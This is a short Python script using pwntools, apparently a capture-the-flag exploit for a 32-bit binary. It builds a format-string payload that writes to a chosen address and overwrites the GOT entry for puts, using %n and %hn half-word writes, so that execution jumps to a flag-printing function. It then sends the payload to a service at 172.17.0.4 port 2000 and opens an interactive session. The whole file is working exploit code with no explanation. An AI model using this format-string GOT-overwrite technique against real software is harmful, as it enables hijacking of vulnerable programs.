import binascii
from pwn import *

context.clear(arch = 'i386')

LOCATION_ADDR = 0x8049c48
PUTS_GOT = 0x8049c28 
FLAG = 0x80485b6

payload = (
    b'AA' + 
    p32(LOCATION_ADDR) + 
    p32(PUTS_GOT + 2) +
    p32(PUTS_GOT) +
    b'%11$n'
    b'%12$2020x' +
    b'%12$hn'
    b'%13$32178x' +
    b'%13$hn'
)

p = remote('172.17.0.4', 2000)
p.sendline(payload)
p.interactive()
